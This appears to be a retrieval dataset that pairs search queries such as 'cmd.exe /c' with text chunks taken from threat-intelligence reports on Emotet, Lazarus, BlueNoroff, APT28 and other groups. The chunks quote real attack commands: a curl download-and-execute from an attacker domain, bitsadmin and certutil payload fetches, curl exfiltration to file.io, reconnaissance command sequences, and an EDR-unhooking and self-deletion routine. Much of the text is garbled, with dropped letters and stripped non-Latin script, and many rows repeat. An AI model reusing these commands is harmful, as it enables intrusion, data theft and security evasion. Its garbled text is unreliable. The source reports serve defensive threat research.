af9a848f4c926a7dce431e4a9399b939,cmd.exe /c,0.7597704693771454,"['NEW EMOTET WAVES Fortunately, the VMware Threat Analysis Unit has a tol at its disposal, caled Symbexcel, that aplies symbolic execution techniques to the analysis of Excel macros.16 Using this tol, we can automaticaly de-obfuscate the XL4 macros and identify the aditional components being downloaded (se Figure 6).', 'Figure 6: A de-obfuscated XL4 macro.', 'The functionality of the macro is threfold: 1.', 'Download the next stage payload from one of the payload hosts.', 'The atackers may chose to use multiple hosts to increase the chances to download the payload and improve suces rates in the event that one or more hosts are taken down.', '2.', 'Execute the downloaded payload by runing rundl32.exe.', '3.', 'Gain registry persistence by runing DlRegisterServer (the de-obfuscated version of D""&""l ""&""lR""&""egister""&""Serve""&""r from the EXEC comand line is shown Figure 6).', 'The payload is a DL file, which (unsurprisingly) is the main Emotet DL.', 'In the case of the Excel document with hash 7c0d0a80e7eb3af7ce549df78a5a68cbd5deb5, the DL is 8cf39a587aeb8f075a0ae23a42e16ce3656e71.']"
6676698d65e372feb79c0159d9d2b11e,cmd.exe /c,1.0,"[', , APT28.', ', , - .', ', - .', ', .', ': OCEANMAP - , C#.', 'cmd.exe.', 'IMAP.', ', base64- , (""Drafts"") ; , \' .', '(""INBOX"").', '( , ), .', "".URL- 'VMSearch.url' .""]"
31347d89b18461f35448b26fefb00133,cmd /c,0.8135172745614935,"['These SQL queries are based on MITREs recomended analytics, and are meant to further asist the SOC analyst in their threat hunt for a potential breach on their network.', '15 KCATA TAERHT FO SROTACIDNI :SRETNUH TAERHT 1.', 'USE CASE: Reg.exe caled from Comand Shel Tactic: TP MITRE Reference: CAR-2013-03-01: Reg.exe caled from Comand Shel Hypothesis: Registry modifications are often esential in SQL Query: establishing persistence via known Windows mechanisms.', ""Many legitimate modifications are done graphicaly via select source.name, data.proces.cmd, count(*) AS regedit.exe or by using the coresponding chanels, or even hostcount from network-events where type = 'sysmon' caling the Registry APIs directly."", ""The built-in utility reg.exe AND data.proces.action = 'launch' AND data.proces."", ""provides a comand-line interface to the registry, so that image.file = 'reg.exe' AND data.proces.parentImage.file = queries and modifications can be performed from a shel, such 'cmd.exe' AND as cmd.exe."", 'When a user is responsible for these actions, the parent of cmd.exe wil likely be explorer.exe.', ""Ocasionaly, (data.proces.cmd LIKE '%ad%' OR data.proces.cmd LIKE power users and administrators write scripts that do this '%delete%' OR data.proces.cmd LIKE '%copy%' OR data."", 'behavior as wel, but likely from a diferent proces tre.', ""proces.cmd LIKE '%restore%' OR data.proces.cmd LIKE These background scripts must be learned so they can be '%load%' OR data.proces.cmd LIKE '%import%') order by tuned out acordingly."", 'hostcount DESC 16 KCATA TAERHT FO SROTACIDNI :SRETNUH TAERHT 2.']"
d5019121cbc645eb0787efab173a12b3,cmd /c,1.0,"['- - .', 'Hi-Tech Crime Trends , - , .', 'Hi-Tech Crime Trends -, - , SOC-, , .', 'Hi-Tech Crime Trends - , , .', 'Group-IB , , - - .', '.', 'Group-IB: , , Leaks , , , , , Group-IB , , , , , GROUP-IB.RU 6 Group-IB Hi-Tech Crime Trends, .', ': Group-IB Threat Inteligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB , , - .', ', Group-IB , .', ', - - .']"
6676698d65e372feb79c0159d9d2b11e,cmd /c,0.8135172745614935,"[', , APT28.', ', , - .', ', - .', ', .', ': OCEANMAP - , C#.', 'cmd.exe.', 'IMAP.', ', base64- , (""Drafts"") ; , \' .', '(""INBOX"").', '( , ), .', "".URL- 'VMSearch.url' .""]"
3d2e99ba94188b71a17364073a49e3ea,batch file,0.7657437517555142,"['3.', 'OilRig (Iran) - OilRig is a suspected Iranian threat group that has targeted Midle Eastern and international victims since at least 2014.', 'The group has targeted a variety of sectors, including financial, government, energy, chemical, and telecomunications.', '4.', 'Sandman (China) - Sandman APT is likely asociated with suspected China-based threat clusters known to use the KEYPLUG backdor, in particular a cluster jointly presented by PwC and Microsoft at Labscon 2023 STORM-086/Red Dev 40.', '5.', 'Arid Viper (Palestine) - Arid Viper is an espionage-motivated cyber threat actor with Hamas- aligned interests.', ""Arid Viper's tolkit is multi-platform and includes the consistent use and develop- ment of mobile spyware since emerging in 2017."", 'Increased industry focus on Arid Viper is an extension of our continuing colective eforts to track threat actors engaged in the Israel-Hamas war.', 'SENTINELONE WATCHTOWER END OF YEAR 2023 18 Top Threats of 2023 by Operating System Windows There was no reduction in Windows malware and loaders in 2023.', ""Many comodity loaders were poly- morphic (change their hash on every execution) and suported atackers' hands-on-keyboard activities for information gathering, disabling security setings, and forging the way for ransomware atacks.""]"
7c835116563bd415741d640fd6a04033,the scriptlet of the batch file,0.8331851796540548,"['The malware execution is done using a legitimate script, SyncApvPublishingServer.vbs, in the system folder.', 'This script is for executing the PowerShel script via a Windows scheduled task.', 'WScript.exe ""%system32%\\SyncApvPublishingServer.vbs"" ""n;cmd.exe \'/c curl 1perseus.bond/Dgy_0dU08lC/hCHEdlDFGV/P89bXhClw/uiOHK5H35B/bM%3D -A cur1-agent -o %public%\\regsile.bat & start /b %public%\\regsile.bat\' We also observed the context around that batch file in our telemetry.', 'The batch file name is What is Blockchain.bat.', 'As the file name sugests, this group stil targets the blockchain industry.', 'We acquired the scriptlet of the batch file.', '1xcopy /h /y /q How-To-Extension.pdf c:\\users\\public\\Inproc.exe* 2start xcopy /h /y /q Blockchain-old.pdf c:\\users\\public\\rwinsta.exe* 3start c:\\users\\public\\Inproc.exe ""%cd%\\Blockchain.pdf"" The Inproc.exe is a legitimate mshta.exe file (MD5 0b4340ed812dc82ce636c0fa5c9bef2), and the rwinsta.exe is a legitimate rundl32.exe file (MD5 ef3179d498793bf4234f708d3be2863).', 'The Blockchain.pdf file is a malicious HTML aplication file spawned by the mshta.exe proces.', 'Unfortunately, we dont have the HTA script (Blockchain.pdf), but we can asume the functionality of the script based on our telemetry showing the decoy document and fetching the next stage payload.', '1# Create a decoy pasword file and open it.', '2cmd.exe"" /c echo {PASWORD}>%documents%\\Userlink & notepad.exe %documents%\\Userlink 3 4# Fetch the payload with cURL comand and execute.']"
920bbf3f4cf30cf9c556531074485448,"cmd.exe"" /c",0.8176210416244082,"['25 EDR/Security bypas tols .', '27 Comand file tol .', '29 Incident investigation .', '30 Technical details part 2.', 'In-the-field analysis results.', '.', '31 Linux MATA generation 3 .', '32 Discovery .', '32 Lateral movement .', '32 Abusing security compliance solution .', '3 Abusing the anti-malware solution .']"
31347d89b18461f35448b26fefb00133,"cmd.exe"" /c",1.0,"['These SQL queries are based on MITREs recomended analytics, and are meant to further asist the SOC analyst in their threat hunt for a potential breach on their network.', '15 KCATA TAERHT FO SROTACIDNI :SRETNUH TAERHT 1.', 'USE CASE: Reg.exe caled from Comand Shel Tactic: TP MITRE Reference: CAR-2013-03-01: Reg.exe caled from Comand Shel Hypothesis: Registry modifications are often esential in SQL Query: establishing persistence via known Windows mechanisms.', ""Many legitimate modifications are done graphicaly via select source.name, data.proces.cmd, count(*) AS regedit.exe or by using the coresponding chanels, or even hostcount from network-events where type = 'sysmon' caling the Registry APIs directly."", ""The built-in utility reg.exe AND data.proces.action = 'launch' AND data.proces."", ""provides a comand-line interface to the registry, so that image.file = 'reg.exe' AND data.proces.parentImage.file = queries and modifications can be performed from a shel, such 'cmd.exe' AND as cmd.exe."", 'When a user is responsible for these actions, the parent of cmd.exe wil likely be explorer.exe.', ""Ocasionaly, (data.proces.cmd LIKE '%ad%' OR data.proces.cmd LIKE power users and administrators write scripts that do this '%delete%' OR data.proces.cmd LIKE '%copy%' OR data."", 'behavior as wel, but likely from a diferent proces tre.', ""proces.cmd LIKE '%restore%' OR data.proces.cmd LIKE These background scripts must be learned so they can be '%load%' OR data.proces.cmd LIKE '%import%') order by tuned out acordingly."", 'hostcount DESC 16 KCATA TAERHT FO SROTACIDNI :SRETNUH TAERHT 2.']"
399c17d5f44d8b855c9751aae73f3c11,"cmd.exe"" /c",0.8937965527573956,"['These files provide sequential execution of comands using algorithmic structures such as conditional operators and lops.', 'Seing as how cmd.exe is employed by atackers in a large number of cases and overlaps with other techniques of the MITRE AT&CK matrix, here we wil examine only a few examples of cmd.exe use at diferent stages of an atack without delving to dep into the details of each example.', 'We give a detailed breakdown of the mentioned procedures in their coresponding techniques.', 'Examples of procedures Example 1 Lateral Tol Transfer via SMB.', 'Atackers use the copy comand to copy the contents of the curent folder to a remote host (the copied files contain the tols and malware that the atacker neds): $system32\\cmd.exe /C copy * \\<remote_ip>\\C$\\windows\\help\\help Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Execution TA02 | Comand and Scripting Interpreter: Windows Comand Shel T1059.03 Contents 90 Example 2 After gaining aces to the system, the atackers conduct reconaisance.', 'Similar to the procedures in the described incidents, the operator executes reconaisance comands from cmd.exe: cmd.exe /C netstat -ano cmd.exe /C systeminfo cmd.exe /C whoami cmd.exe /C net view \\<hostname> cmd.exe /C tasklist /v cmd.exe /C arp -a cmd.exe /C net use cmd.exe /C ping <host> -n <count> cmd.exe /C net user <username> /dom cmd.exe /C net group domain admins /dom cmd.exe /C echo list volume | diskpart Example 3 Atackers use cmd.exe to run their malware: cmd /c $system32\\conhost64.exe Example 4 Atackers use cmd.exe to download the tols that they wil use in subsequent stages of an atack to the compromised system: cmd.exe /c bitsadmin /transfer n hxp:/8.210.141[.', ']104:809/1.txt $public\\Downloads\\1.txt cmd.exe /c certutil -urlcache -split -f hxp:/8.210.141[.', ']104:809/MEUpdate.exe $windir\\Help\\Help\\MEUpdate.exe Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Execution TA02 | Comand and Scripting Interpreter: Windows Comand Shel T1059.03 Contents 91 Example 5 Operators exfiltrate the colected data to an external service: cmd.exe /C curl -F ""file=@$selfpath\\1.rar"" -sl-no-revoke htps:/file.io Example 6 Atackers employ their own batch scripts to perform repetitive actions on a local host and remote ones.', 'Here is a fragment of one script (MD5: 78E8B01C74DA6E0B8A10281C3B13D5B6): Figure 40 Script fragment Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Execution TA02 | Comand and Scripting Interpreter: Windows Comand Shel T1059.03 Contents 92 The script gathers data on the system and saves this data to files, then ads them to an archive.', 'Here are al the reconaisance comands employed in the script: ver > :\\Windows\\Web\\systeminfo.txtb time /t > :\\Windows\\Web\\systeminfo.txtb date /t > :\\Windows\\Web\\systeminfo.txtb hostname > :\\Windows\\Web\\systeminfo.txtb systeminfo > :\\Windows\\Web\\systeminfo.txtb net localgroup Administrators > :\\Windows\\Web\\systeminfo.txtb ipconfig /al > :\\Windows\\Web\\systeminfo.txtb tasklist /v > :\\Windows\\Web\\systeminfo.txtb tasklist -svc > :\\Windows\\Web\\systeminfo.txtb net start > :\\Windows\\Web\\systeminfo.txtb ping w.yandex.ru > :\\Windows\\Web\\systeminfo.txtb tracert -h 5 w.yandex.ru > :\\Windows\\Web\\systeminfo.txtb netstat -aon > :\\Windows\\Web\\systeminfo.txtb netstat -bv > :\\Windows\\Web\\systeminfo.txtb net use > :\\Windows\\Web\\systeminfo.txtb net share > :\\Windows\\Web\\systeminfo.txtb net view > :\\Windows\\Web\\systeminfo.txtb net view /domain > :\\Windows\\Web\\systeminfo.txtb net group /domain > :\\Windows\\Web\\systeminfo.txtb net user > :\\Windows\\Web\\systeminfo.txtb net user /domain > :\\Windows\\Web\\systeminfo.txtb net group ""domain controlers"" /domain > :\\Windows\\Web\\systeminfo.txtb net group ""domain admins"" /domain > :\\Windows\\Web\\systeminfo.txtb net group ""domain computers"" /domain > :\\Windows\\Web\\systeminfo.txtb nltest /domain_trusts > :\\Windows\\Web\\systeminfo.txtb route print > :\\Windows\\Web\\systeminfo.txtb arp -a > :\\Windows\\Web\\systeminfo.txtb dir /a ""c:\\program files\\*.', '*"" > :\\Windows\\Web\\systeminfo.txtb dir /a ""c:\\Program Files (x86)\\*.']"
cd55962babfd80de741da3cfcd92ebe3,"cmd.exe"" /c",0.82672272449881,"['It is worth noting that these samples were al compiled after the domain began being used alongside the knf.gov[.', ']pl watering-hole.', 'Aditionaly, the samples uploaded from Poland and Uruguay match with the watering-hole activity observed sugesting this is al part of the same campaign.', 'Despite this potential conection to the Poland bank compromises, the malware is not particularly advanced for example using basic operations to gather system information.', 'The malware atempts to run a series of comands with cmd.exe and then returns the result via the C&C, eye-watch[.]in.', 'These comands are as folows: cmd.exe /c hostname cmd.exe /c whoami cmd.exe /c ver cmd.exe /c ipconfig -al cmd.exe /c ping w.gogle.com cmd.exe /c query user cmd.exe /c net user cmd.exe /c net view cmd.exe /c net view /domain cmd.exe /c reg query ""HKCU\\SOFTWARE\\Microsoft\\Windows\\CurentVersion\\Internet Setings"" cmd.exe /c tasklist /svc cmd.exe /c netstat -ano | find ""TCP"" An example C&C beacon is sen below: GET /design/dfbox/list.jsp?action=What&u=10729854751740 HTP/1.1 Conection: Kep-Alive User-Agent: Mozila/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/2010101 Firefox/47.0 Host: w.eye-watch[.', ']in SILVERLIGHT XAP FILE The cambio.xap archive sample (4c10ab3f4e6769e520694a10f61d5) does not use eye-watch[.', ']in as a C&C chanel but instead was downloaded from the URL: hxps:/w.eye-watch[.', ""]in/design/fancybox/include/cambio.xap 'cambio' is Spanish for 'change'."", 'The URL is similar to that noted in the BadCyber blog, and the use of an XAP file matches what can be found in the Archive.org cache for the sap.misapor[.', ']ch site.']"
4cfa49159667f23c95faae1778231c91,"cmd.exe"" /c",0.845503132152836,"['Modular architecture of the victims infection proces provides both aditional flexibility and anonymity throughout the cyber-atack.', 'This scheme alows hackers to divide software development activity betwen teams, as wel as to ensure the reuse of program code.', 'Recon Performs initial reconaisance to determine if a systems is of interest to the threat actors Droper Extracts and decrypts Loader Loader Decrypts the payload Client_RAT or Client_TraficForwarder and injects into the legitimate proces Client_TraficForwarder Forwards operators comands from external network into corporate network Client_RAT Provides ful control over the target system Recon is a backdor that is initialy instaled on the target machine through sucesful execution of exploits.', 'This module is used by hackers to perform initial reconaisance to search for systems of interest.', 'Once launched, the program ads itself to the auto-start by copying its file to the directory ""%USERPROFILE%\\ApData\\Roaming\\Microsoft\\Windows\\ Start Menu\\Programs\\Startup"", colects data about the system and network environment and sends them to the C&C server.', 'Below is a list of data colected: cmd.exe /c hostname cmd.exe /c whoami cmd.exe /c ver cmd.exe /c ipconfig -al cmd.exe /c ping w.gogle.com cmd.exe /c query user cmd.exe /c net user cmd.exe /c net view cmd.exe /c net view /domain cmd.exe /c reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\ CurentVersion\\Internet Setings cmd.exe /c tasklist /svc cmd.exe /c netstat -ano | find TCP 12 Lazarus arisen: architecture, tols, atribution 1 Key 2 Atack 3 Atack 4 Recomendations 5 Indicators of 6 Apendix Findings preparation and organizers compromise implementation In the event the system is not of interest, the module wil use the ""kilkil"" comand to remove itself from the infected system.', 'If the system is of interest, then Recon downloads Droper using the htp comand.', 'Droper wil then instal Client_RAT to the infected system as folows: RECON DROPER LOADER CLIENT_RAT 1 2 3 DROPER Recon decrypts LOADER Droper decrypts CLIENT_RAT Loader decrypts LOADER and embeds CLIENT_RAT and embeds Loader and embeds CLIENT_RAT Droper extracts decrypted Client_RAT Client_RAT Droper extracts and decrypts Loader, embeds it into the system and extracts Client_RAT.', 'To decrypt the configuration file, Droper neds MD5 encryption key, which only the atacker knows.', 'Group-IB specialists have analyzed two versions of Droper.', 'There are no fundamental diferences betwen them: both versions were used to decrypt the loader and encrypted payload, as wel as to ensure loader persistence in the system.']"
d5019121cbc645eb0787efab173a12b3,"cmd.exe"" /c",0.8135172745614935,"['- - .', 'Hi-Tech Crime Trends , - , .', 'Hi-Tech Crime Trends -, - , SOC-, , .', 'Hi-Tech Crime Trends - , , .', 'Group-IB , , - - .', '.', 'Group-IB: , , Leaks , , , , , Group-IB , , , , , GROUP-IB.RU 6 Group-IB Hi-Tech Crime Trends, .', ': Group-IB Threat Inteligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB , , - .', ', Group-IB , .', ', - - .']"
d5019121cbc645eb0787efab173a12b3,"cmd.exe"" /c",0.7962584600454754,"['- - .', 'Hi-Tech Crime Trends , - , .', 'Hi-Tech Crime Trends -, - , SOC-, , .', 'Hi-Tech Crime Trends - , , .', 'Group-IB , , - - .', '.', 'Group-IB: , , Leaks , , , , , Group-IB , , , , , GROUP-IB.RU 6 Group-IB Hi-Tech Crime Trends, .', ': Group-IB Threat Inteligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB , , - .', ', Group-IB , .', ', - - .']"
af9a848f4c926a7dce431e4a9399b939,"cmd.exe"" /c",0.7597704693771454,"['NEW EMOTET WAVES Fortunately, the VMware Threat Analysis Unit has a tol at its disposal, caled Symbexcel, that aplies symbolic execution techniques to the analysis of Excel macros.16 Using this tol, we can automaticaly de-obfuscate the XL4 macros and identify the aditional components being downloaded (se Figure 6).', 'Figure 6: A de-obfuscated XL4 macro.', 'The functionality of the macro is threfold: 1.', 'Download the next stage payload from one of the payload hosts.', 'The atackers may chose to use multiple hosts to increase the chances to download the payload and improve suces rates in the event that one or more hosts are taken down.', '2.', 'Execute the downloaded payload by runing rundl32.exe.', '3.', 'Gain registry persistence by runing DlRegisterServer (the de-obfuscated version of D""&""l ""&""lR""&""egister""&""Serve""&""r from the EXEC comand line is shown Figure 6).', 'The payload is a DL file, which (unsurprisingly) is the main Emotet DL.', 'In the case of the Excel document with hash 7c0d0a80e7eb3af7ce549df78a5a68cbd5deb5, the DL is 8cf39a587aeb8f075a0ae23a42e16ce3656e71.']"
6676698d65e372feb79c0159d9d2b11e,"cmd.exe"" /c",1.0,"[', , APT28.', ', , - .', ', - .', ', .', ': OCEANMAP - , C#.', 'cmd.exe.', 'IMAP.', ', base64- , (""Drafts"") ; , \' .', '(""INBOX"").', '( , ), .', "".URL- 'VMSearch.url' .""]"
7c835116563bd415741d640fd6a04033,This script is for executing the PowerShell script via a Windows scheduled task,0.8406220239370058,"['From our telemetry, however, we can confirm the victim was eventualy compromised by backdor-type malware.', 'Based on the malwares static information, and parts of the internal code, we ases that the final payload is stil very similar to the Persistence Backdor #2[1] we described in our previous blog.', 'Updated method #2: Scripts and novel downloader Aditionaly, we observed the download and launch of a suspicious batch file.', 'The actor exploited diferent LOLBins.', 'The malware execution is done using a legitimate script, SyncApvPublishingServer.vbs, in the system folder.', 'This script is for executing the PowerShel script via a Windows scheduled task.', 'WScript.exe ""%system32%\\SyncApvPublishingServer.vbs"" ""n;cmd.exe \'/c curl 1perseus.bond/Dgy_0dU08lC/hCHEdlDFGV/P89bXhClw/uiOHK5H35B/bM%3D -A cur1-agent -o %public%\\regsile.bat & start /b %public%\\regsile.bat\' We also observed the context around that batch file in our telemetry.', 'The batch file name is What is Blockchain.bat.', 'As the file name sugests, this group stil targets the blockchain industry.', 'We acquired the scriptlet of the batch file.', '1xcopy /h /y /q How-To-Extension.pdf c:\\users\\public\\Inproc.exe* 2start xcopy /h /y /q Blockchain-old.pdf c:\\users\\public\\rwinsta.exe* 3start c:\\users\\public\\Inproc.exe ""%cd%\\Blockchain.pdf"" The Inproc.exe is a legitimate mshta.exe file (MD5 0b4340ed812dc82ce636c0fa5c9bef2), and the rwinsta.exe is a legitimate rundl32.exe file (MD5 ef3179d498793bf4234f708d3be2863).']"
7c835116563bd415741d640fd6a04033,downloader contains an encrypted configuration at the end of the file.,0.8543411034009736,"['Upon launch, it copies the D ump.bin file to the % Templates%\\war[curent time][random value].bin (i.e., war168129643245.bin).', 'The Dump.bin has a modified PE header.', 'The malware reads the first byte of Dump.bin, 0xAF in this file, and decodes 0x3E8 bytes with that key.', 'The decrypted data is the header of a PE file, overwriting the recovered header to the original file.', 'Eventualy, it loads the decrypted DL file by spawning the ordinary first export function.', 'The spawned downloader contains an encrypted configuration at the end of the file.', 'The malware first acquires the total size of the configuration data and the length of the payload URL from the end of the file.', 'They are located four bytes and eight bytes from the end of the file, respectively.', 'The malware decrypts the configuration data with the RC4 algorithm using an embeded 64-byte key.', 'RC4 key: 46 61 4 6D 38 43 74 42 48 37 57 36 36 30 7 6C 62 74 70 79 57 67 34 6A 79 4C 46 62 67 52 3 49 76 52 7 36 45 64 46 38 49 47 36 36 37 64 30 54 45 69 6D 7A 54 69 5A 36 61 42 74 65 69 67 50 3 Restored URL: hxps:/docs.azure- protection[.', ']cloud/EMPxSKTgr3/2CKnoSNLF/0d6rQrBEMv/gGFroIw5_m/n9hLXkEOy3/wyQ%3D%3D Structure of configuration In the case of another downloader, however, the payload URL was delivered using a comand line parameter.']"
51185768d14821d01e022a38adf50777,an encrypted decoy document,0.7875653041394559,"['Figure 1: BlackEnergy Builder from 207 The convergence of crimeware and APT atacks BLACKENERGY & QUEDAGH 3 The original BlackEnergy tolkit first emerged in 207 and Some earlier instaler variants, then named regedt32.', 'is refered to in this paper as BlackEnergy 1.', 'A later variant exe, were distributed by documents exploiting software of the tolkit (BlackEnergy 2) was released in 2010.', 'We also vulnerabilities, one of which was CVE-2010-3.', 'These encountered a previously unsen variant, which had ben documents drop and execute the instaler, then open a rewriten and uses a diferent format for its configuration.', 'decoy document.', 'It is reasonable to asume that a similar It also no longer uses a driver component.', 'We dubed this aproach has ben used to deliver the more recent new variant BlackEnergy 3. instaler variants.', 'The instaler filename of BlackEnergy 3 is stil msiexec.exe.', 'INFECTION VECTORS However, it is delivered and executed by a droper which Most of the recent BlackEnergy instalers colected are opens a decoy document in the foreground.', 'We also named msiexec.exe.']"
2616e67f35145c59084ed54bd6a95dba,an encrypted decoy document,0.9450985937091767,"['To sucesfuly exploit a vulnerability, the shelcode is first decrypted.', 'It then searches for the The majority of the Taidor malware samples we have filehandle of the exploit document by comparing the file sen in the wild were delivered via email.', 'We also saw sizes of enumerated handles to a hardcoded file size considerable variations among the email and IP that is suposed to be that of the exploit document.', 'adreses the senders used.', 'Once the handle is found, two bufers are read from the We listed down some of the emails that were sent via an exploit document, which contains the encrypted payload IP adres that also served as a C&C server below.', 'This and an encrypted decoy document.', 'was one of the IP adreses that some compromised systems acesed.', 'While we do not exactly know how The payload is then decrypted and saved as a file in the the compromises ocured, we can, based on the Windows temporary directory.', 'The payload is then atackers method of operation, determine which email comonly executed using the WinExec aplication was the most likely atack vector.', 'programing interface (API).', 'Sample email 18 After the payload is executed, the decoy document is From: minaki.yang@yaho.com decrypted and also saved in the Windows temporary Subject: US-TAIWAN directory.']"
7c835116563bd415741d640fd6a04033,The PDF and executable files have numerous spaces before the file extension to hide it and allay suspicions.,0.7618733672795419,"['When the user clicks the link, it executes the 1.vbs file through the WScript proces.', 'When we checked the VBS file, it only generated an ok mesage, which sugests BlueNorof is stil experimenting with this method.', '<?xml version=""1.0"" encoding=""UTF-8"" standalone=""yes""?> <Relationships xmlns=""htp:/schemas.openxmlformats.org/package/206/relationships""> 1 <Relationship Id=""rId2"" Type=""htp:/schemas.openxmlformats.org/oficeDocument/206/relationships/hyperlink"" 2 Target=""wscript%201.vbs"" TargetMode=""External""/><Relationship Id=""rId1"" Type=""htp:/schemas.openxmlformats.org/oficeDocument/206/relationships/slideLayout"" Target=""./slideLayouts/slideLayout1.xml""/></Relationships> Based on our other findings, we discovered an in-the-wild sample (MD5 a17e9fc78706431fc8b3085380fe29f) from VirusTotal.', 'At the time of analysis, this .vhd sample wasnt detected by any antivirus.', 'The virtual disk file contains a decoy PDF file, Windows executable file, and an encrypted Dump.bin file.', 'The PDF and executable files have numerous spaces before the file extension to hide it and alay suspicions.', '4/12 Files inside VHD a file The Job_Description[spaces].exe file (MD5 931d0969654af3f7fc1dab9e2bd6b1) is a loader that loads the next stage payload.', 'Upon launch, it copies the D ump.bin file to the % Templates%\\war[curent time][random value].bin (i.e., war168129643245.bin).', 'The Dump.bin has a modified PE header.', 'The malware reads the first byte of Dump.bin, 0xAF in this file, and decodes 0x3E8 bytes with that key.', 'The decrypted data is the header of a PE file, overwriting the recovered header to the original file.']"
7c835116563bd415741d640fd6a04033,The malware decrypts the configuration data with the RC4 algorithm using an embedded 64-byte key.,0.8480365622652383,"['The decrypted data is the header of a PE file, overwriting the recovered header to the original file.', 'Eventualy, it loads the decrypted DL file by spawning the ordinary first export function.', 'The spawned downloader contains an encrypted configuration at the end of the file.', 'The malware first acquires the total size of the configuration data and the length of the payload URL from the end of the file.', 'They are located four bytes and eight bytes from the end of the file, respectively.', 'The malware decrypts the configuration data with the RC4 algorithm using an embeded 64-byte key.', 'RC4 key: 46 61 4 6D 38 43 74 42 48 37 57 36 36 30 7 6C 62 74 70 79 57 67 34 6A 79 4C 46 62 67 52 3 49 76 52 7 36 45 64 46 38 49 47 36 36 37 64 30 54 45 69 6D 7A 54 69 5A 36 61 42 74 65 69 67 50 3 Restored URL: hxps:/docs.azure- protection[.', ']cloud/EMPxSKTgr3/2CKnoSNLF/0d6rQrBEMv/gGFroIw5_m/n9hLXkEOy3/wyQ%3D%3D Structure of configuration In the case of another downloader, however, the payload URL was delivered using a comand line parameter.', 'Also, some of the other downloaders (MD5 f76f97eb213d81bf15c02d4681c50a4) have functionality that checks the working environment.', 'If the size of physical memory is les than 2,147,483,648 bytes, the malware terminates execution.', '5/12 Infection flow of downloader This downloader checks for the names of the folowing antivirus vendors: Sophos, Kaspersky, Avast, Avira, Bitdefender, TrendMicro, and Windows Defender.']"
7c835116563bd415741d640fd6a04033,"checks for the names of the following antivirus vendors: Sophos, Kaspersky, Avast, Avira, Bitdefender, TrendMicro, and Windows Defender",0.7675742459744291,"['The malware decrypts the configuration data with the RC4 algorithm using an embeded 64-byte key.', 'RC4 key: 46 61 4 6D 38 43 74 42 48 37 57 36 36 30 7 6C 62 74 70 79 57 67 34 6A 79 4C 46 62 67 52 3 49 76 52 7 36 45 64 46 38 49 47 36 36 37 64 30 54 45 69 6D 7A 54 69 5A 36 61 42 74 65 69 67 50 3 Restored URL: hxps:/docs.azure- protection[.', ']cloud/EMPxSKTgr3/2CKnoSNLF/0d6rQrBEMv/gGFroIw5_m/n9hLXkEOy3/wyQ%3D%3D Structure of configuration In the case of another downloader, however, the payload URL was delivered using a comand line parameter.', 'Also, some of the other downloaders (MD5 f76f97eb213d81bf15c02d4681c50a4) have functionality that checks the working environment.', 'If the size of physical memory is les than 2,147,483,648 bytes, the malware terminates execution.', '5/12 Infection flow of downloader This downloader checks for the names of the folowing antivirus vendors: Sophos, Kaspersky, Avast, Avira, Bitdefender, TrendMicro, and Windows Defender.', 'If TrendMicro, BitDefender, or Windows Defender products are instaled, the malware conducts a clasic unhoking DL trick intended to remove user-mode hoks from the system library.', 'This evasion technique overwrites the .text section of the pre-loaded ntdl library with the freshly loaded one so that the hoked API adreses are recovered with the original API adres.', 'With this trick, the malware can disable the functionalities of EDR/AV products.', 'Next, the malware creates a mutex to avoid duplicate execution.', 'Mutex name: da9f0e7dc6c5204fa29bea537b4792b8b87373ba9ad816d5c9f5f275f03f Next, the malware opens a PDF decoy document in the same directory.']"
7c835116563bd415741d640fd6a04033,the malware can disable the functionalities of EDR/AV products.,0.9000973469819743,"['Also, some of the other downloaders (MD5 f76f97eb213d81bf15c02d4681c50a4) have functionality that checks the working environment.', 'If the size of physical memory is les than 2,147,483,648 bytes, the malware terminates execution.', '5/12 Infection flow of downloader This downloader checks for the names of the folowing antivirus vendors: Sophos, Kaspersky, Avast, Avira, Bitdefender, TrendMicro, and Windows Defender.', 'If TrendMicro, BitDefender, or Windows Defender products are instaled, the malware conducts a clasic unhoking DL trick intended to remove user-mode hoks from the system library.', 'This evasion technique overwrites the .text section of the pre-loaded ntdl library with the freshly loaded one so that the hoked API adreses are recovered with the original API adres.', 'With this trick, the malware can disable the functionalities of EDR/AV products.', 'Next, the malware creates a mutex to avoid duplicate execution.', 'Mutex name: da9f0e7dc6c5204fa29bea537b4792b8b87373ba9ad816d5c9f5f275f03f Next, the malware opens a PDF decoy document in the same directory.', 'The decoy document masquerades as a job ofer from a Japanese multinational bank.', 'If Windows Defender or Bitdefender Antivirus is instaled on the victims computer, the malware executes itself with the folowing comands: Windows Defender: cmd /c timeout /t 10 & Del /f /q \\[curent file name]\\ & atrib -s -h \\[PDF decoy file]\\ & rundl32 \\[curent DL file path]\\ #1 Bitdefender: cmd /c timeout /t 10 & rundl32 \\[curent DL file path]\\ #1 The primary objective of this malware is to fetch the next stage payload.', 'To do this, the malware uses the cURL library, combining cURL comands depending on the antivirus instaled.']"
3d2e99ba94188b71a17364073a49e3ea,download of a batch (.bat) file.,0.8775091407829108,"['3.', 'OilRig (Iran) - OilRig is a suspected Iranian threat group that has targeted Midle Eastern and international victims since at least 2014.', 'The group has targeted a variety of sectors, including financial, government, energy, chemical, and telecomunications.', '4.', 'Sandman (China) - Sandman APT is likely asociated with suspected China-based threat clusters known to use the KEYPLUG backdor, in particular a cluster jointly presented by PwC and Microsoft at Labscon 2023 STORM-086/Red Dev 40.', '5.', 'Arid Viper (Palestine) - Arid Viper is an espionage-motivated cyber threat actor with Hamas- aligned interests.', ""Arid Viper's tolkit is multi-platform and includes the consistent use and develop- ment of mobile spyware since emerging in 2017."", 'Increased industry focus on Arid Viper is an extension of our continuing colective eforts to track threat actors engaged in the Israel-Hamas war.', 'SENTINELONE WATCHTOWER END OF YEAR 2023 18 Top Threats of 2023 by Operating System Windows There was no reduction in Windows malware and loaders in 2023.', ""Many comodity loaders were poly- morphic (change their hash on every execution) and suported atackers' hands-on-keyboard activities for information gathering, disabling security setings, and forging the way for ransomware atacks.""]"
